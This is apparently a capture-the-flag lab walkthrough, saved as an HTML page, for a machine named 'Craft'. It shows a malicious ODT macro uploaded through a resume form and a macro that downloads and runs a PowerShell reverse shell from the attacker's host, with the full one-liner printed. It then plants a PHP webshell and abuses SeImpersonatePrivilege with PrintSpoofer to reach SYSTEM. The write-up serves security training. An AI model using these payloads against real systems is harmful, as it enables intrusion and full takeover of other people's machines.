@@ -1,0 +1,279 @@
+<div id="__BVID__12___BV_modal_content_" tabindex="-1" class="modal-content"><header id="__BVID__12___BV_modal_header_" class="modal-header"><h5 id="__BVID__12___BV_modal_title_" class="modal-title">Walkthrough</h5><button type="button" aria-label="Close" class="close">×</button></header><div id="__BVID__12___BV_modal_body_" class="modal-body"><div class="mb-2 flex-grow" on-finish="function() {
+    [native code]
+}"><div class="markdown-container"><div class="markdown-content text-main-color"><!----><div><h1>Exploitation Guide for Craft</h1>
+<h2>Summary</h2>
+<p>In this guide, we will use macros in ODT files uploaded to a resume web form to gain a foothold. We will then migrate to the <code>apache</code> user and abuse <code>SeImpersonatePrivilege</code> permission to elevate our privilege.</p>
+<h2>Enumeration</h2>
+<h3>Nmap</h3>
+<p>We'll start by looking for open ports with an <code>nmap</code> scan.</p>
+<pre id="fence-code-1" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ sudo nmap 192.168.120.63                               
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-25 10:02 EDT
+Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
+Nmap done: 1 IP address (0 hosts up) scanned in 3.12 seconds
+</code></pre>
+<p>It looks like the target might be blocking ICMP traffic, requiring us to use the <code>-Pn</code> option. Let's proceed with that.</p>
+<pre id="fence-code-2" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ sudo nmap -sV -sC -Pn 192.168.120.63
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-19 13:07 EDT
+Nmap scan report for 192.168.120.63
+Host is up (0.031s latency).
+Not shown: 998 filtered ports
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
+|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
+|_http-title: Craft
+...
+</code></pre>
+<p>We found only an HTTP server running on port 80. Let's take a look at it.</p>
+<h3>Apache Enumeration</h3>
+<p>Opening up http://192.168.120.63 in the browser, we are presented with a page titled "Craft". After scrolling down a bit, we notice a form where a user can upload a resume to join the team.</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG-Practice_86_image_1_3JFk6dZs.png" alt="Craft Submit Resume Form">
+<figcaption>Craft Submit Resume Form</figcaption>
+</figure>
+<p></p>
+<p>Let's try to upload a file. We create a simple text file and upload it to the web form.</p>
+<pre id="fence-code-3" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ echo "test" &gt; resume.txt
+</code></pre>
+<p>After clicking "Upload", we are presented with an error message.</p>
+<blockquote>
+<p>File is not valid. Please submit ODT file</p>
+</blockquote>
+<p>This form apparently only accepts ODT files; so, let's make one.</p>
+<p>We need to install LibreOffice Writer first.</p>
+<pre id="fence-code-4" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ sudo apt update  
+...
+┌──(kali㉿kali)-[~]
+└─$ sudo apt-get install -y libreoffice-writer
+...
+</code></pre>
+<p>Let's open LibreOffice Writer and create a new file named <strong>resume.odt</strong>. Writer saves in ODT format by default.</p>
+<p>Uploading this ODT file to the same web form presents us with a different message.</p>
+<blockquote>
+<p>You're resume was submitted , it will be reviewed shortly by our staff</p>
+</blockquote>
+<p>This message implies that the uploaded file will be opened by a user shortly after submission.</p>
+<h2>Exploitation</h2>
+<p>Let's try to create an ODT file with a VBA macro and see if it's executed.</p>
+<p>We'll go back to our test ODT file in LibreOffice Writer. In the top menu, we click "Tools" and navigate to "Macros" -&gt; "Organize Macros" -&gt; "Basic".</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG-Practice_86_image_2_8pZJHqRJ.png" alt="Opening Basic Macros Menu">
+<figcaption>Opening Basic Macros Menu</figcaption>
+</figure>
+<p></p>
+<p>With the Basic Macros window open, we'll choose our document under "Macro From" on the left side and click the "New" button on the right.</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG-Practice_86_image_3_238Qwmfa.png" alt="Basic Macros Menu">
+<figcaption>Basic Macros Menu</figcaption>
+</figure>
+<p></p>
+<p>Let's leave the Name as "Module1" and click "OK".</p>
+<p>In the new window, we need to add our vba code to the panel on the right between <code>Sub Main</code> and <code>End Sub</code>. To test, let's just add a simple web request back to our kali machine.</p>
+<pre id="fence-code-5" class="fence-code"><code class="language-vb">Sub Main
+    Shell("cmd /c powershell iwr 192.168.118.14")
+End Sub
+</code></pre>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG-Practice_86_image_4_KMyPBPG3.png" alt="Adding VBA Code">
+<figcaption>Adding VBA Code</figcaption>
+</figure>
+<p></p>
+<p>Let's click the save icon on the top menu and close this window.</p>
+<p>Next, we will need to create a trigger to execute our code. From the top menu, let's click on "Tools" and then "Customize...". In the new window that appears, we click the "Events" tab. Let's choose "Open Document" from the main panel and click the "Macro..." button on the right side.</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG-Practice_86_image_5_G6ptMddD.png" alt="Choosing Macro Trigger">
+<figcaption>Choosing Macro Trigger</figcaption>
+</figure>
+<p></p>
+<p>In the Macro Selector window, we need to click the "<strong>+</strong>" symbol next to our document under "Library", then click the <strong>+</strong> next to "Standard". Let's select our "Module1" and make sure "Main" is selected on the "Macro Name" panel.</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG-Practice_86_image_6_HLfEiWq9.png" alt="Choosing Our Macro to Trigger">
+<figcaption>Choosing Our Macro to Trigger</figcaption>
+</figure>
+<p></p>
+<p>Finally, let's click the "OK" button on both open windows and save the document.</p>
+<p>In a Kali terminal, let's start a python webserver on port 80 to catch the request from our macro.</p>
+<pre id="fence-code-6" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ sudo python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre>
+<p>Back in the browser, let's upload our new macro-infused ODT file to the website.</p>
+<p>After a few seconds, we have a connection to out python webserver.</p>
+<pre id="fence-code-7" class="fence-code"><code>192.168.120.63 - - [20/Oct/2021 15:29:57] "GET / HTTP/1.1" 200 -
+</code></pre>
+<p>This shows us that we are indeed able to execute code through a macro in an uploaded ODT file.</p>
+<p>To use this RCE vector to get a shell, we can create an ODT file that will download a PowerShell payload from our python webserver and execute it.</p>
+<p>For the PowerShell payload, we can use a reverse shell one-liner from <a href="https://github.com/samratashok/nishang" target="_blank">nishang</a> at https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1</p>
+<p>Let's save this payload into a file named <strong>rev.ps1</strong> making sure to change the IP to our Kali box's IP address.</p>
+<pre id="fence-code-8" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ cat rev.ps1 
+$client = New-Object System.Net.Sockets.TCPClient("192.168.118.14",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "&gt; ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+</code></pre>
+<p>Next, let's create the ODT file naming it <strong>resume2.odt</strong>. We create this file the same way we did before, except with the following code:</p>
+<pre id="fence-code-9" class="fence-code"><code>Sub Main
+    Shell("cmd /c powershell iwr http://192.168.118.14/rev.ps1 -o C:/Windows/Tasks/rev.ps1")
+    Shell("cmd /c powershell -c C:/Windows/Tasks/rev.ps1")
+End Sub
+</code></pre>
+<p>We also need to make sure the file will trigger the macro on Document Open like before.</p>
+<p>Before we upload <strong>resume2.odt</strong> to the webfrom, let's start our reverse shell listener.</p>
+<pre id="fence-code-10" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ nc -lnvp 1234
+listening on [any] 1234 ...
+</code></pre>
+<p>We upload <strong>resume2.odt</strong> and after a few seconds we see the target request the <strong>rev.ps1</strong> from our python webserver.</p>
+<pre id="fence-code-11" class="fence-code"><code>192.168.120.63 - - [20/Oct/2021 16:49:48] "GET /rev.ps1 HTTP/1.1" 200 -
+</code></pre>
+<p>Shortly after that, we receive a connection to the reverse shell listener. It may take a couple of tries sometimes.</p>
+<pre id="fence-code-12" class="fence-code"><code>connect to [192.168.118.14] from (UNKNOWN) [192.168.120.63] 49719
+PS C:\Program Files\LibreOffice\program&gt; whoami
+craft\thecybergeek
+</code></pre>
+<p>We now have shell access as the user <code>thecybergeek</code>!</p>
+<h2>Escalation</h2>
+<p>Enumerating the system with the <code>thecybergeek</code> account we don't find much of interest, but we do discover that we are able to write to the <strong>C:\xampp\htdocs</strong> directory.</p>
+<pre id="fence-code-13" class="fence-code"><code>PS C:\Program Files\LibreOffice\program&gt; icacls C:\xampp\htdocs
+C:\xampp\htdocs CRAFT\apache:(OI)(CI)(F)
+                CRAFT\apache:(I)(OI)(CI)(F)
+                NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+                BUILTIN\Administrators:(I)(OI)(CI)(F)
+                BUILTIN\Users:(I)(OI)(CI)(RX)
+                BUILTIN\Users:(I)(CI)(AD)
+                BUILTIN\Users:(I)(CI)(WD)
+                CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+
+Successfully processed 1 files; Failed processing 0 files
+</code></pre>
+<p>If we list the users' directory, we'll find the <code>apache</code> user account.</p>
+<pre id="fence-code-14" class="fence-code"><code>PS C:\Program Files\LibreOffice\program&gt; dir C:\Users
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        5/28/2021   3:53 AM                Administrator                                                         
+d-----        7/13/2021   3:19 AM                apache                                                                
+d-r---        5/28/2021   3:53 AM                Public                                                                
+d-----        7/13/2021   3:35 AM                thecybergeek
+</code></pre>
+<p>We can use this to place a PHP webshell into <strong>C:\xampp\htdocs</strong> and compromise the <code>apache</code> user account, which may have better privilege escalation opportunities.</p>
+<p>Let's create a file in the directory we are hosting with our python webserver named <strong>cmd.php</strong> with the following contents:</p>
+<pre id="fence-code-15" class="fence-code"><code class="language-php">&lt;?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?&gt;
+</code></pre>
+<p>Back in our reverse shell on the target system, let's download our PHP shell and place it in <strong>C:\xampp\htdocs</strong>.</p>
+<pre id="fence-code-16" class="fence-code"><code>PS C:\Program Files\LibreOffice\program&gt; iwr http://192.168.118.14/cmd.php -OutFile C:\xampp\htdocs\cmd.php
+PS C:\Program Files\LibreOffice\program&gt; dir C:\xampp\htdocs\
+
+
+    Directory: C:\xampp\htdocs
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----        7/13/2021   3:18 AM                assets                                                                
+d-----        7/13/2021   3:18 AM                css                                                                   
+d-----        7/13/2021   3:18 AM                js                                                                    
+d-----       10/20/2021   1:51 PM                uploads                                                               
+-a----       10/21/2021   9:34 AM             80 cmd.php                                                               
+-a----         7/7/2021  10:53 AM           9635 index.php                                                             
+-a----         7/7/2021   9:56 AM            835 upload.php                                                            
+
+
+PS C:\Program Files\LibreOffice\program&gt; 
+</code></pre>
+<p>We can use <code>curl</code> to execute commands via our webshell. Let's verify that we have access to the <code>apache</code> account and list some information about it using <code>whoami /all</code>.</p>
+<pre id="fence-code-17" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ curl http://192.168.120.63/cmd.php?cmd=whoami+/all
+
+USER INFORMATION
+----------------
+
+User Name    SID                                         
+============ ============================================
+craft\apache S-1-5-21-537427935-490066102-1511301751-1000
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                           Type             SID          Attributes                                        
+==================================== ================ ============ ==================================================
+Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeTcbPrivilege                Act as part of the operating system       Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+┌──(kali㉿kali)-[~]
+└─$ 
+</code></pre>
+<p>In the <em>PRIVILEGES INFORMATION</em> section, we discover that the <code>apache</code> user has <code>SeImpersonatePrivilege</code> enabled. Having researched this privilege, we can leverage it to compromise the <code>SYSTEM</code> account by using <a href="https://github.com/itm4n/PrintSpoofer" target="_blank">PrintSpoofer</a> to elevate our privilege.</p>
+<p>Let's download <strong>PrintSpoofer64.exe</strong> to our kali machine.</p>
+<pre id="fence-code-18" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+--2021-10-25 08:38:15--  https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+...
+</code></pre>
+<p>Hosting it with our python web server, we'll next download it to the target system. Let's use <a href="https://gchq.github.io/CyberChef/" target="_blank">CyberChef</a> to URL-encode our command and use <code>curl</code> again to send a request to the webshell.</p>
+<pre id="fence-code-19" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ curl http://192.168.120.63/cmd.php?cmd=powershell%20iwr%20http://192.168.118.14/PrintSpoofer64.exe%20-OutFile%20C:%5CWindows%5Ctasks%5CPrintSpoofer64.exe
+</code></pre>
+<p>With <strong>PrintSpoofer64.exe</strong> in place, we can reuse the <strong>rev.ps1</strong> we dropped earlier to facilitate a reverse shell with higher privileges.</p>
+<p>Let's start a listener on the same port as before.</p>
+<pre id="fence-code-20" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ nc -lnvp 1234
+listening on [any] 1234 ...
+</code></pre>
+<p>Next, we once again use <a href="https://gchq.github.io/CyberChef/" target="_blank">CyberChef</a> to encode our payload that executes the reverse shell with <strong>PrintSpoofer64.exe</strong>.</p>
+<pre id="fence-code-21" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ curl http://192.168.120.63/cmd.php?cmd=C:%5CWindows%5Ctasks%5CPrintSpoofer64.exe%20-c%20%22cmd%20/c%20powershell%20-c%20C:/Windows/Tasks/rev.ps1%22
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+</code></pre>
+<p>We now have a connection back to our listener with a <code>SYSTEM</code> level PowerShell session!</p>
+<pre id="fence-code-22" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ nc -lnvp 1234
+listening on [any] 1234 ...
+connect to [192.168.118.14] from (UNKNOWN) [192.168.120.63] 49913
+whoami
+nt authority\system
+PS C:\Windows\system32&gt; 
+</code></pre>
+</div><!----></div></div><div class="d-flex flex-row full-width mt-4 mb-1 justify-content-end"><button type="button" class="btn transparent-btn mb-2 pl-0 pr-0 btn-link btn-lg">
+      Close
+    </button><!----></div></div></div><!----></div>
